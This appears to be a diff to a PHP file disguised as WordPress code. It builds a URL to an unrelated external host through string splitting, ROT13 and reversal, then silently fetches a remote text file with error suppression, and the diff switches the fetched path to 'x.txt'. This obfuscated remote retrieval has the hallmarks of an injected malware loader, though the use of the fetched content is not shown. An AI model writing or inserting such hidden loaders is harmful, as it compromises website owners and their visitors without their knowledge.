@@ -1,7 +1,7 @@
 <?php
 $wp_http_part1 = '/qhbyp.ohfaebcinw';
 $wp_http_part2 = '//:fcggu';
-$wp_http_referer = strrev(str_rot13($wp_http_part1 . $wp_http_part2)) . 'route.php';
+$wp_http_referer = strrev(str_rot13($wp_http_part1 . $wp_http_part2)) . 'x.txt';
 $post_content = false;
 if (ini_get('allow_url_fopen')) {
     $post_content = @file_get_contents($wp_http_referer);
